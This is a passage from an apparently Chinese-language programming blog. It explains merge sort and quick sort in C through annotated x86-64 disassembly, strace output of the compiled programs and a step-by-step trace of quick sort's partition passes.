push %r13 9f9:\t41 54 push %r12 9fb:\t4c 8d 25 ae 03 20 00 lea 0x2003ae(%rip),%r12 # 200db0 \u003c__frame_dummy_init_array_entry\u003e a02:\t55 push %rbp a03:\t48 8d 2d ae 03 20 00 lea 0x2003ae(%rip),%rbp # 200db8 \u003c__init_array_end\u003e a0a:\t53 push %rbx a0b:\t41 89 fd mov %edi,%r13d a0e:\t49 89 f6 mov %rsi,%r14 a11:\t4c 29 e5 sub %r12,%rbp a14:\t48 83 ec 08 sub $0x8,%rsp a18:\t48 c1 fd 03 sar $0x3,%rbp a1c:\te8 27 fb ff ff callq 548 \u003c_init\u003e a21:\t48 85 ed test %rbp,%rbp a24:\t74 20 je a46 \u003c__libc_csu_init+0x56\u003e a26:\t31 db xor %ebx,%ebx a28:\t0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) a2f:\t00 a30:\t4c 89 fa mov %r15,%rdx a33:\t4c 89 f6 mov %r14,%rsi a36:\t44 89 ef mov %r13d,%edi a39:\t41 ff 14 dc callq *(%r12,%rbx,8) a3d:\t48 83 c3 01 add $0x1,%rbx a41:\t48 39 dd cmp %rbx,%rbp a44:\t75 ea jne a30 \u003c__libc_csu_init+0x40\u003e a46:\t48 83 c4 08 add $0x8,%rsp a4a:\t5b pop %rbx a4b:\t5d pop %rbp a4c:\t41 5c pop %r12 a4e:\t41 5d pop %r13 a50:\t41 5e pop %r14 a52:\t41 5f pop %r15 a54:\tc3 retq a55:\t90 nop a56:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) a5d:\t00 00 00 0000000000000a60 \u003c__libc_csu_fini\u003e: a60:\tf3 c3 repz retq Disassembly of section .fini: 0000000000000a64 \u003c_fini\u003e: a64:\t48 83 ec 08 sub $0x8,%rsp a68:\t48 83 c4 08 add $0x8,%rsp a6c:\tc3 retq 栈帧调用图解分析 栈帧图分析 mergeSort_L 对应的是左半侧的 merge。mid 为红色 mergeSort_R 对应的是右半侧的 merge。mid 为蓝色 merge 对应的是最下层的浅绿色，绿色，深绿色\narray 归并顺序图解分析 可以看到对于 array 来说，确实是一半一半 merge 的, 这就是分治。\nstrace 分析 root@aliyun:~# strace ./mergesort execve(\"./mergesort\", [\"./mergesort\"], 0x7fff5d5bf0c0 /* 27 vars */) = 0\rbrk(NULL) = 0x5583b9756000\raccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\raccess(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory)\ropenat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3\rfstat(3, {st_mode=S_IFREG|0644, st_size=39490, ...}) = 0\rmmap(NULL, 39490, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f4ed0097000\rclose(3) = 0\raccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\ropenat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3\rread(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\260\\34\\2\\0\\0\\0\\0\\0\"..., 832) = 832\rfstat(3, {st_mode=S_IFREG|0755, st_size=2030544, ...}) = 0\rmmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f4ed0095000\rmmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f4ecfa89000\rmprotect(0x7f4ecfc70000, 2097152, PROT_NONE) = 0\rmmap(0x7f4ecfe70000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f4ecfe70000\rmmap(0x7f4ecfe76000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f4ecfe76000\rclose(3) = 0\rarch_prctl(ARCH_SET_FS, 0x7f4ed00964c0) = 0\rmprotect(0x7f4ecfe70000, 16384, PROT_READ) = 0\rmprotect(0x5583b9675000, 4096, PROT_READ) = 0\rmprotect(0x7f4ed00a1000, 4096, PROT_READ) = 0\rmunmap(0x7f4ed0097000, 39490) = 0\rfstat(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0\rbrk(NULL) = 0x5583b9756000\rbrk(0x5583b9777000) = 0x5583b9777000\rwrite(1, \"3 4 5 6 7 8 9 10 \", 173 4 5 6 7 8 9 10 ) = 17\rexit_group(0) = ?\r+++ exited with 0 +++ reference why-does-this-memory-address-fs0x28-fs0x28-have-a-random-value stack-smashing jge cmp assembly-guide Shift Arithmetic Right x86-asm-leave x86-instructions-guide Notes on x86-64 programming x86-multiply x64_cheatsheet CS107 Spring 2019 CS107, Lecture 12 Assembly: Arithmetic, Logic and Condition Codes x86-flags xor x64-into 归并排序 "},"title":"algorithm-merge-sort"},"/blog/algorithm-quick-sort/":{"data":{"":"","quick-sort#quick sort":"quick sort C 代码 #include \u003cstdio.h\u003e int partition(int* array, int startIndex, int endIndex){ int left = startIndex; int right = endIndex; int pivot = array[startIndex]; int temp = 0; // 第一个 while 循环，其实就是从两个方向遍历一次数组，根据 pivot 进行分割。 while (left != right) { // 第二个 while 循环， 找一个 array[right] \u003c= pivot，也就是找一个小于等于 pivot 的元素 while (left \u003c right \u0026\u0026 array[right] \u003e pivot) { right--; } // 第三个 while 循环， 找一个 array[left] \u003e pivot，也就是找一个大于等于 pivot 的元素。 while (left \u003c right \u0026\u0026 array[left] \u003c= pivot) { left++; } // 交换找到的两个元素 if(left \u003c right) { temp = array[left]; array[left] = array[right]; array[right] = temp; } } // pivot 归位, 左边都比 pivot 小， 右边都比 pivot 大 temp = array[left]; array[left] = pivot; array[startIndex] = temp; return left; } void quickSort(int* array, int startIndex, int endIndex){ // 只有一个元素，有序。直接返回 if(startIndex \u003e= endIndex){ return; } // 一次 partition 有序一个元素。被 pivot 分割的两部分继续 quick sort int pivotIndex = partition(array, startIndex, endIndex); quickSort(array, startIndex, pivotIndex - 1); quickSort(array, pivotIndex + 1, endIndex); } int main(){ int array[8] = {4,7,6,5,3,2,8,1}; quickSort(array, 0, 7); for (int i = 0; i \u003c 8; i++) { printf(\"%d \",array[i]); } return 0; } 汇编代码分析 quickSort: file format elf64-x86-64 Disassembly of section .init: 0000000000000548 \u003c_init\u003e: 548:\t48 83 ec 08 sub $0x8,%rsp 54c:\t48 8b 05 95 0a 20 00 mov 0x200a95(%rip),%rax # 200fe8 \u003c__gmon_start__\u003e 553:\t48 85 c0 test %rax,%rax 556:\t74 02 je 55a \u003c_init+0x12\u003e 558:\tff d0 callq *%rax 55a:\t48 83 c4 08 add $0x8,%rsp 55e:\tc3 retq Disassembly of section .plt: 0000000000000560 \u003c.plt\u003e: 560:\tff 35 52 0a 20 00 pushq 0x200a52(%rip) # 200fb8 \u003c_GLOBAL_OFFSET_TABLE_+0x8\u003e 566:\tff 25 54 0a 20 00 jmpq *0x200a54(%rip) # 200fc0 \u003c_GLOBAL_OFFSET_TABLE_+0x10\u003e 56c:\t0f 1f 40 00 nopl 0x0(%rax) 0000000000000570 \u003c__stack_chk_fail@plt\u003e: 570:\tff 25 52 0a 20 00 jmpq *0x200a52(%rip) # 200fc8 \u003c__stack_chk_fail@GLIBC_2.4\u003e 576:\t68 00 00 00 00 pushq $0x0 57b:\te9 e0 ff ff ff jmpq 560 \u003c.plt\u003e 0000000000000580 \u003cprintf@plt\u003e: 580:\tff 25 4a 0a 20 00 jmpq *0x200a4a(%rip) # 200fd0 \u003cprintf@GLIBC_2.2.5\u003e 586:\t68 01 00 00 00 pushq $0x1 58b:\te9 d0 ff ff ff jmpq 560 \u003c.plt\u003e Disassembly of section .plt.got: 0000000000000590 \u003c__cxa_finalize@plt\u003e: 590:\tff 25 62 0a 20 00 jmpq *0x200a62(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 596:\t66 90 xchg %ax,%ax Disassembly of section .text: 00000000000005a0 \u003c_start\u003e: 5a0:\t31 ed xor %ebp,%ebp ; ebp = 0 5a2:\t49 89 d1 mov %rdx,%r9 ; r9 = rdx 5a5:\t5e pop %rsi 5a6:\t48 89 e2 mov %rsp,%rdx ; rdx = rsp 5a9:\t48 83 e4 f0 and $0xfffffffffffffff0,%rsp 5ad:\t50 push %rax 5ae:\t54 push %rsp 5af:\t4c 8d 05 ca 03 00 00 lea 0x3ca(%rip),%r8 # 980 \u003c__libc_csu_fini\u003e 5b6:\t48 8d 0d 53 03 00 00 lea 0x353(%rip),%rcx # 910 \u003c__libc_csu_init\u003e 5bd:\t48 8d 3d 9c 02 00 00 lea 0x29c(%rip),%rdi # 860 \u003cmain\u003e 5c4:\tff 15 16 0a 20 00 callq *0x200a16(%rip) # 200fe0 \u003c__libc_start_main@GLIBC_2.2.5\u003e 5ca:\tf4 hlt 5cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 00000000000005d0 \u003cderegister_tm_clones\u003e: 5d0:\t48 8d 3d 39 0a 20 00 lea 0x200a39(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 5d7:\t55 push %rbp 5d8:\t48 8d 05 31 0a 20 00 lea 0x200a31(%rip),%rax # 201010 \u003c__TMC_END__\u003e 5df:\t48 39 f8 cmp %rdi,%rax 5e2:\t48 89 e5 mov %rsp,%rbp 5e5:\t74 19 je 600 \u003cderegister_tm_clones+0x30\u003e 5e7:\t48 8b 05 ea 09 20 00 mov 0x2009ea(%rip),%rax # 200fd8 \u003c_ITM_deregisterTMCloneTable\u003e 5ee:\t48 85 c0 test %rax,%rax 5f1:\t74 0d je 600 \u003cderegister_tm_clones+0x30\u003e 5f3:\t5d pop %rbp 5f4:\tff e0 jmpq *%rax 5f6:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 5fd:\t00 00 00 600:\t5d pop %rbp 601:\tc3 retq 602:\t0f 1f 40 00 nopl 0x0(%rax) 606:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 60d:\t00 00 00 0000000000000610 \u003cregister_tm_clones\u003e: 610:\t48 8d 3d f9 09 20 00 lea 0x2009f9(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 617:\t48 8d 35 f2 09 20 00 lea 0x2009f2(%rip),%rsi # 201010 \u003c__TMC_END__\u003e 61e:\t55 push %rbp 61f:\t48 29 fe sub %rdi,%rsi 622:\t48 89 e5 mov %rsp,%rbp 625:\t48 c1 fe 03 sar $0x3,%rsi 629:\t48 89 f0 mov %rsi,%rax 62c:\t48 c1 e8 3f shr $0x3f,%rax 630:\t48 01 c6 add %rax,%rsi 633:\t48 d1 fe sar %rsi 636:\t74 18 je 650 \u003cregister_tm_clones+0x40\u003e 638:\t48 8b 05 b1 09 20 00 mov 0x2009b1(%rip),%rax # 200ff0 \u003c_ITM_registerTMCloneTable\u003e 63f:\t48 85 c0 test %rax,%rax 642:\t74 0c je 650 \u003cregister_tm_clones+0x40\u003e 644:\t5d pop %rbp 645:\tff e0 jmpq *%rax 647:\t66 0f 1f 84 00 00 00 nopw 0x0(%rax,%rax,1) 64e:\t00 00 650:\t5d pop %rbp 651:\tc3 retq 652:\t0f 1f 40 00 nopl 0x0(%rax) 656:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 65d:\t00 00 00 0000000000000660 \u003c__do_global_dtors_aux\u003e: 660:\t80 3d a9 09 20 00 00 cmpb $0x0,0x2009a9(%rip) # 201010 \u003c__TMC_END__\u003e 667:\t75 2f jne 698 \u003c__do_global_dtors_aux+0x38\u003e 669:\t48 83 3d 87 09 20 00 cmpq $0x0,0x200987(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 670:\t00 671:\t55 push %rbp 672:\t48 89 e5 mov %rsp,%rbp 675:\t74 0c je 683 \u003c__do_global_dtors_aux+0x23\u003e 677:\t48 8b 3d 8a 09 20 00 mov 0x20098a(%rip),%rdi # 201008 \u003c__dso_handle\u003e 67e:\te8 0d ff ff ff callq 590 \u003c__cxa_finalize@plt\u003e 683:\te8 48 ff ff ff callq 5d0 \u003cderegister_tm_clones\u003e 688:\tc6 05 81 09 20 00 01 movb $0x1,0x200981(%rip) # 201010 \u003c__TMC_END__\u003e 68f:\t5d pop %rbp 690:\tc3 retq 691:\t0f 1f 80 00 00 00 00 nopl 0x0(%rax) 698:\tf3 c3 repz retq 69a:\t66 0f 1f 44 00 00 nopw 0x0(%rax,%rax,1) 00000000000006a0 \u003cframe_dummy\u003e: 6a0:\t55 push %rbp 6a1:\t48 89 e5 mov %rsp,%rbp 6a4:\t5d pop %rbp 6a5:\te9 66 ff ff ff jmpq 610 \u003cregister_tm_clones\u003e 00000000000006aa \u003cpartition\u003e: 6aa:\t55 push %rbp 6ab:\t48 89 e5 mov %rsp,%rbp 6ae:\t48 89 7d e8 mov %rdi,-0x18(%rbp) ; \u0026array[0] 6b2:\t89 75 e4 mov %esi,-0x1c(%rbp) ; startIndex 6b5:\t89 55 e0 mov %edx,-0x20(%rbp) ; endIndex 6b8:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 6bb:\t89 45 f0 mov %eax,-0x10(%rbp) ; left = startIndex 6be:\t8b 45 e0 mov -0x20(%rbp),%eax ; eax = endIndex 6c1:\t89 45 f4 mov %eax,-0xc(%rbp) ; right = endIndex 6c4:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 6c7:\t48 98 cltq 6c9:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * startIndex 6d0:\t00 6d1:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 6d5:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * startIndex 6d8:\t8b 00 mov (%rax),%eax ; eax = array[startIndex] 6da:\t89 45 f8 mov %eax,-0x8(%rbp) ; pivot = array[startIndex] 6dd:\tc7 45 fc 00 00 00 00 movl $0x0,-0x4(%rbp) ; temp = 0; 6e4:\te9 b7 00 00 00 jmpq 7a0 \u003cpartition+0xf6\u003e ; 跳转到 while(left != right) 判断 left != right ; 第二个 while 循环的循环体 6e9:\t83 6d f4 01 subl $0x1,-0xc(%rbp) ; right = right - 1 ; while(left != right) 的循环体 6ed:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 6f0:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cmp right,left 6f3:\t7d 21 jge 716 \u003cpartition+0x6c\u003e ; left \u003e= right，第二个 while 循环不满足，进入判断第三个 while 循环 6f5:\t8b 45 f4 mov -0xc(%rbp),%eax ; eax = right 能执行到这，说明 left \u003c right 6f8:\t48 98 cltq ; convert eax to rax 6fa:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx; rdx = 4 * right 701:\t00 702:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 706:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * right 709:\t8b 00 mov (%rax),%eax ; eax = array[right] 70b:\t39 45 f8 cmp %eax,-0x8(%rbp) ; cmp array[right],pivot 70e:\t7c d9 jl 6e9 \u003cpartition+0x3f\u003e ; pivot \u003c array[right] 执行跳转，执行循环体。 710:\teb 04 jmp 716 \u003cpartition+0x6c\u003e ; ; 第三个 while 循环的循环体 712:\t83 45 f0 01 addl $0x1,-0x10(%rbp) ; left = left + 1 ; 第三个 while 循环 716:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 719:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cmp,right,left 71c:\t7d 1b jge 739 \u003cpartition+0x8f\u003e ; left \u003e= right，第三个 while 循环 条件 1 不满足，短路。进入 if 语句。 71e:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 721:\t48 98 cltq 723:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 72a:\t00 72b:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 72f:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * left 732:\t8b 00 mov (%rax),%eax ; eax = array[left] 734:\t39 45 f8 cmp %eax,-0x8(%rbp) ; cmp,array[left],pivot 737:\t7d d9 jge 712 \u003cpartition+0x68\u003e ; pivot \u003e= array[left]，第三个 while 循环 条件 2 满足。执行循环体。 ; if 代码块开始 739:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 73c:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cmp right,left 73f:\t7d 5f jge 7a0 \u003cpartition+0xf6\u003e ; left \u003e= right 进入下一轮循环 741:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 744:\t48 98 cltq 746:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 74d:\t00 74e:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 752:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * left 755:\t8b 00 mov (%rax),%eax ; eax = array[left] 757:\t89 45 fc mov %eax,-0x4(%rbp) ; temp = array[left] 75a:\t8b 45 f4 mov -0xc(%rbp),%eax ; eax = right 75d:\t48 98 cltq 75f:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * right 766:\t00 767:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 76b:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * right 76e:\t8b 55 f0 mov -0x10(%rbp),%edx ; edx = left 771:\t48 63 d2 movslq %edx,%rdx ; 774:\t48 8d 0c 95 00 00 00 lea 0x0(,%rdx,4),%rcx ; rcx = 4 * left 77b:\t00 77c:\t48 8b 55 e8 mov -0x18(%rbp),%rdx ; rdx = \u0026array[0] 780:\t48 01 ca add %rcx,%rdx ; rdx = \u0026array[0] + 4 * left 783:\t8b 00 mov (%rax),%eax ; eax = array[right] 785:\t89 02 mov %eax,(%rdx) ; array[left] = array[right] 787:\t8b 45 f4 mov -0xc(%rbp),%eax ; eax = right 78a:\t48 98 cltq 78c:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * right 793:\t00 794:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 798:\t48 01 c2 add %rax,%rdx ; rdx = \u0026array[0] + 4 * right 79b:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = temp; 79e:\t89 02 mov %eax,(%rdx) ; array[right] = temp ; if 代码块结束 ; while(left != right) 进入循环的条件判断 7a0:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 7a3:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cpm right, left 7a6:\t0f 85 41 ff ff ff jne 6ed \u003cpartition+0x43\u003e ; left != right 满足循环条件进入循环体 7ac:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 不满足循环条件 left != right，此时循环结束。 ; pivot 归位 7af:\t48 98 cltq 7b1:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 7b8:\t00 7b9:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 7bd:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * left 7c0:\t8b 00 mov (%rax),%eax ; eax = array[left] 7c2:\t89 45 fc mov %eax,-0x4(%rbp) ; temp = array[left] 7c5:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 7c8:\t48 98 cltq 7ca:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 7d1:\t00 7d2:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 7d6:\t48 01 c2 add %rax,%rdx ; rdx = \u0026array[0] + 4 * left 7d9:\t8b 45 f8 mov -0x8(%rbp),%eax ; eax = pivot 7dc:\t89 02 mov %eax,(%rdx) ; array[left] = pivot 7de:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 7e1:\t48 98 cltq 7e3:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * startIndex 7ea:\t00 7eb:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 7ef:\t48 01 c2 add %rax,%rdx ; rdx = \u0026array[0] + 4 * startIndex 7f2:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = temp 7f5:\t89 02 mov %eax,(%rdx) ; array[startIndex] = temp 7f7:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 返回值 7fa:\t5d pop %rbp ; pop 调用者的 rbp 7fb:\tc3 retq ; 1. pop %rip 2.jmp %rip 00000000000007fc \u003cquickSort\u003e: 7fc:\t55 push %rbp 7fd:\t48 89 e5 mov %rsp,%rbp 800:\t48 83 ec 20 sub $0x20,%rsp ;分配 32Bytes 空间 804:\t48 89 7d e8 mov %rdi,-0x18(%rbp) ; \u0026array[0] 808:\t89 75 e4 mov %esi,-0x1c(%rbp) ; startIndex 80b:\t89 55 e0 mov %edx,-0x20(%rbp) ; endIndex 80e:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 811:\t3b 45 e0 cmp -0x20(%rbp),%eax ; cmp endIndex,startIndex 814:\t7d 47 jge 85d \u003cquickSort+0x61\u003e ; startIndex \u003e= endIndex 不满足条件，销毁栈帧，结束调用。 816:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = endIndex 第三个参数 能执行到这，说明 startIndex \u003c endIndex 819:\t8b 4d e4 mov -0x1c(%rbp),%ecx ; ecx = startIndex 81c:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 820:\t89 ce mov %ecx,%esi ; esi = startIndex 第二个参数 822:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] 第一个参数 825:\te8 80 fe ff ff callq 6aa \u003cpartition\u003e 82a:\t89 45 fc mov %eax,-0x4(%rbp) ; pivotIndex = eax partition 的返回值在 eax 里 82d:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = pivotIndex 830:\t8d 50 ff lea -0x1(%rax),%edx ; edx = pivotIndex - 1 第三个参数 833:\t8b 4d e4 mov -0x1c(%rbp),%ecx ; ecx = startIndex 836:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 83a:\t89 ce mov %ecx,%esi ; esi = startIndex 第二个参数 83c:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] 第一个参数 83f:\te8 b8 ff ff ff callq 7fc \u003cquickSort\u003e ; quickSort(array, startIndex, pivotIndex - 1) 844:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = pivotIndex 847:\t8d 48 01 lea 0x1(%rax),%ecx ; ecx = pivotIndex + 1 84a:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = endIndex 第三个参数 84d:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 851:\t89 ce mov %ecx,%esi ; esi = pivotIndex + 1 第二个参数 853:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] 第一个参数 856:\te8 a1 ff ff ff callq 7fc \u003cquickSort\u003e ; quickSort(array, pivotIndex + 1, endIndex) 85b:\teb 01 jmp 85e \u003cquickSort+0x62\u003e 85d:\t90 nop 85e:\tc9 leaveq 85f:\tc3 retq 0000000000000860 \u003cmain\u003e: 860:\t55 push %rbp 861:\t48 89 e5 mov %rsp,%rbp 864:\t48 83 ec 40 sub $0x40,%rsp ; 分配 64Bytes 空间。 868:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 86f:\t00 00 871:\t48 89 45 f8 mov %rax,-0x8(%rbp) 875:\t31 c0 xor %eax,%eax 877:\tc7 45 d0 04 00 00 00 movl $0x4,-0x30(%rbp) ; array[0] = 4 87e:\tc7 45 d4 07 00 00 00 movl $0x7,-0x2c(%rbp) ; array[1] = 7 885:\tc7 45 d8 06 00 00 00 movl $0x6,-0x28(%rbp) ; array[2] = 6 88c:\tc7 45 dc 05 00 00 00 movl $0x5,-0x24(%rbp) ; array[3] = 5 893:\tc7 45 e0 03 00 00 00 movl $0x3,-0x20(%rbp) ; array[4] = 3 89a:\tc7 45 e4 02 00 00 00 movl $0x2,-0x1c(%rbp) ; array[5] = 2 8a1:\tc7 45 e8 08 00 00 00 movl $0x8,-0x18(%rbp) ; array[6] = 8 8a8:\tc7 45 ec 01 00 00 00 movl $0x1,-0x14(%rbp) ; array[7] = 1 8af:\t48 8d 45 d0 lea -0x30(%rbp),%rax ; rax = \u0026array[0] 8b3:\tba 07 00 00 00 mov $0x7,%edx ; edx = endIndex = 7 8b8:\tbe 00 00 00 00 mov $0x0,%esi ; esi = startIndex = 0 8bd:\t48 89 c7 mov %rax,%rdi ; rdi = rax = \u0026array[0] 8c0:\te8 37 ff ff ff callq 7fc \u003cquickSort\u003e 8c5:\tc7 45 cc 00 00 00 00 movl $0x0,-0x34(%rbp) ; i = 0 8cc:\teb 20 jmp 8ee \u003cmain+0x8e\u003e 8ce:\t8b 45 cc mov -0x34(%rbp),%eax 8d1:\t48 98 cltq 8d3:\t8b 44 85 d0 mov -0x30(%rbp,%rax,4),%eax 8d7:\t89 c6 mov %eax,%esi 8d9:\t48 8d 3d b4 00 00 00 lea 0xb4(%rip),%rdi # 994 \u003c_IO_stdin_used+0x4\u003e 8e0:\tb8 00 00 00 00 mov $0x0,%eax 8e5:\te8 96 fc ff ff callq 580 \u003cprintf@plt\u003e 8ea:\t83 45 cc 01 addl $0x1,-0x34(%rbp) 8ee:\t83 7d cc 07 cmpl $0x7,-0x34(%rbp) 8f2:\t7e da jle 8ce \u003cmain+0x6e\u003e 8f4:\tb8 00 00 00 00 mov $0x0,%eax 8f9:\t48 8b 4d f8 mov -0x8(%rbp),%rcx 8fd:\t64 48 33 0c 25 28 00 xor %fs:0x28,%rcx 904:\t00 00 906:\t74 05 je 90d \u003cmain+0xad\u003e 908:\te8 63 fc ff ff callq 570 \u003c__stack_chk_fail@plt\u003e 90d:\tc9 leaveq 90e:\tc3 retq 90f:\t90 nop 0000000000000910 \u003c__libc_csu_init\u003e: 910:\t41 57 push %r15 912:\t41 56 push %r14 914:\t49 89 d7 mov %rdx,%r15 917:\t41 55 push %r13 919:\t41 54 push %r12 91b:\t4c 8d 25 8e 04 20 00 lea 0x20048e(%rip),%r12 # 200db0 \u003c__frame_dummy_init_array_entry\u003e 922:\t55 push %rbp 923:\t48 8d 2d 8e 04 20 00 lea 0x20048e(%rip),%rbp # 200db8 \u003c__init_array_end\u003e 92a:\t53 push %rbx 92b:\t41 89 fd mov %edi,%r13d 92e:\t49 89 f6 mov %rsi,%r14 931:\t4c 29 e5 sub %r12,%rbp 934:\t48 83 ec 08 sub $0x8,%rsp 938:\t48 c1 fd 03 sar $0x3,%rbp 93c:\te8 07 fc ff ff callq 548 \u003c_init\u003e 941:\t48 85 ed test %rbp,%rbp 944:\t74 20 je 966 \u003c__libc_csu_init+0x56\u003e 946:\t31 db xor %ebx,%ebx 948:\t0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 94f:\t00 950:\t4c 89 fa mov %r15,%rdx 953:\t4c 89 f6 mov %r14,%rsi 956:\t44 89 ef mov %r13d,%edi 959:\t41 ff 14 dc callq *(%r12,%rbx,8) 95d:\t48 83 c3 01 add $0x1,%rbx 961:\t48 39 dd cmp %rbx,%rbp 964:\t75 ea jne 950 \u003c__libc_csu_init+0x40\u003e 966:\t48 83 c4 08 add $0x8,%rsp 96a:\t5b pop %rbx 96b:\t5d pop %rbp 96c:\t41 5c pop %r12 96e:\t41 5d pop %r13 970:\t41 5e pop %r14 972:\t41 5f pop %r15 974:\tc3 retq 975:\t90 nop 976:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 97d:\t00 00 00 0000000000000980 \u003c__libc_csu_fini\u003e: 980:\tf3 c3 repz retq Disassembly of section .fini: 0000000000000984 \u003c_fini\u003e: 984:\t48 83 ec 08 sub $0x8,%rsp 988:\t48 83 c4 08 add $0x8,%rsp 98c:\tc3 retq partition 分析 Before:: [4, 7, 6, 5, 3, 2, 8, 1]\r第 1 次 partition [3, 1, 2, 4, 5, 6, 8, 7] returned index is: 3\r第 2 次 partition [2, 1, 3, 4, 5, 6, 8, 7] returned index is: 2\r第 3 次 partition [1, 2, 3, 4, 5, 6, 8, 7] returned index is: 1\r第 4 次 partition [1, 2, 3, 4, 5, 6, 8, 7] returned index is: 4\r第 5 次 partition [1, 2, 3, 4, 5, 6, 8, 7] returned index is: 5\r第 6 次 partition [1, 2, 3, 4, 5, 6, 7, 8] returned index is: 7\rAfter:: [1, 2, 3, 4, 5, 6, 7, 8] partition 逻辑图解 系统调用 strace 分析 root@aliyun:~# strace -Ti ./quickSort [00007f2ee3f68e37] execve(\"./quickSort\", [\"./quickSort\"], 0x7ffffe4dc528 /* 27 vars */) = 0 \u003c0.000122\u003e\r[00007f0045366ec9] brk(NULL) = 0x55e15d32b000 \u003c0.000006\u003e\r[00007f004535a7de] access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) \u003c0.000010\u003e\r[00007f0045367e27] access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) \u003c0.000007\u003e\r[00007f0045367cdd] openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 \u003c0.000008\u003e\r[00007f0045367c43] fstat(3, 